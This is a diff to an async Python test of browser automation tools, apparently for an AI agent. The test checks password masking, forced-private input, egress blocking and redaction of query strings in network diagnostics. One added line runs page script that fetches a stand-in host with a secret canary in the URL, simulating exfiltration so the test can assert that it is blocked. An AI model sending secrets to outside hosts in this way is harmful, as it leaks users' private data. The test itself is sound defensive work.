@@ -42,6 +42,31 @@ async def test_browser_real_dom_refs_actions_and_masked_screenshot(tmp_path):
             await tools.type(refs['Password'], 'PASSWORD-CANARY')
             snapshot = await tools.snapshot()
             assert 'CANARY-SECRET' not in str(snapshot)
+            await page.evaluate("() => {let e=document.createElement('p');e.textContent='Public search suggestion';document.body.append(e)}")
+            await tools.type(refs['Name'], 'Public search suggestion', private=False)
+            assert 'Public search suggestion' in (await tools.snapshot())['text']
+            assert 'Public search suggestion' not in tools._secret_values
+            forced=await tools.type(refs['Password'], 'FORCED-PRIVATE-CANARY', private=False)
+            assert forced['private'] is True
+            assert 'FORCED-PRIVATE-CANARY' in tools._secret_values
+            await page.evaluate("() => fetch('https://blocked.test/api?secret=QUERY-CANARY').catch(() => null)")
+            snapshot=await tools.snapshot()
+            assert snapshot['network']['blocked_hosts']==['blocked.test']
+            assert 'QUERY-CANARY' not in str(snapshot)
+            await page.route('**/diagnostic-failure*', lambda route: route.fulfill(status=503, body='Temporary failure'))
+            await page.evaluate("() => fetch('/diagnostic-failure?private=QUERY-CANARY')")
+            snapshot=await tools.snapshot()
+            assert snapshot['network']['failed_requests'][-1]=={'host':'127.0.0.1','status':503}
+            assert 'QUERY-CANARY' not in str(snapshot)
+            await page.evaluate("() => document.querySelector('input').onkeyup = e => document.querySelector('#status').textContent = 'Key events received'")
+            await tools.type(refs['Name'], 'Public keyboard query', private=False, sequential=True)
+            assert 'Key events received' in (await tools.snapshot())['text']
+            await page.evaluate("() => {let e=document.createElement('ul');e.innerHTML='<li>Public option</li>';e.onclick=()=>document.querySelector('#status').textContent='Option selected';document.body.append(e)}")
+            snapshot=await tools.snapshot()
+            option=next(e for e in snapshot['elements'] if e['role']=='li' and e['name']=='Public option')
+            assert option['rect']['width']>0 and option['readonly'] is False
+            await tools.click(option['ref'])
+            assert 'Option selected' in (await tools.snapshot())['text']
             assert before_hash != (await tools.screenshot())['state_hash']
             await tools.select(refs['Choice'], 'b')
             evidence = await tools.screenshot()
@@ -60,6 +85,10 @@ async def test_browser_real_dom_refs_actions_and_masked_screenshot(tmp_path):
             await tools.type('label:Name', 'semantic value')
             await tools.click('text:Save')
             assert 'Saved' in (await tools.snapshot())['text']
+            rect = await page.get_by_text('Save', exact=True).bounding_box()
+            await tools.click_at(int(rect['x']+rect['width']/2), int(rect['y']+rect['height']/2))
+            with pytest.raises(ValueError, match='within the current viewport'):
+                await tools.click_at(-1, 10)
             with pytest.raises(PermissionError):
                 await tools.goto('https://example.com')
             with pytest.raises(ValueError):
